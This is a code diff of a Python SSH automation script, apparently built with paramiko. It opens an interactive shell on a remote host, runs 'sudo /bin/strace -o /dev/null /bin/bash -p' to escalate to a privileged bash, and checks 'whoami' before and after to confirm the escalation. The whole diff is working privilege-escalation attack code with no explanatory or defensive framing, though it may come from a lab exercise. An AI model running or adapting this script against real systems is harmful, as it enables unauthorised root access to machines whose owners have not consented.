@@ -43,18 +43,48 @@ try:
     # Connect to the server
     client.connect(hostname, port=port, username=username, password=password)
     
+    shell = client.invoke_shell()
+    
+    time.sleep(1)
+    if shell.recv_ready():
+        shell.recv(65535)
+    
     # test 
-    stdin, stdout, stderr = client.exec_command("whoami")
-    print(stdout.read().decode())
-    print(stderr.read().decode())
+    shell.send(b"whoami\n")
     
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")
+    print(output)
+        
+    shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
+        
     time.sleep(3)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")
+    print(output)
+            
+    shell.send(b"whoami\n")
     
-    stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p && whoami")
-    print(stdout.read().decode())
-    print(stderr.read().decode())
+    time.sleep(1)
+    output = ""
+    while shell.recv_ready():
+        output += shell.recv(4096).decode("utf-8")     
+    print(output)
+               
+    # stdin, stdout, stderr = client.exec_command("whoami")
+    # print(stdout.read().decode())
+    # print(stderr.read().decode())
     
-    time.sleep(5)
+    # time.sleep(3)
+    
+    # stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p && whoami")
+    # print(stdout.read().decode())
+    # print(stderr.read().decode())
+    
+    # time.sleep(5)
     
     # stdin, stdout, stderr = client.exec_command("whoami")
     # print(stdout.read().decode())
@@ -120,6 +150,7 @@ try:
     
 finally:
     # close the connection
+    shell.close()
     client.close()
     
 
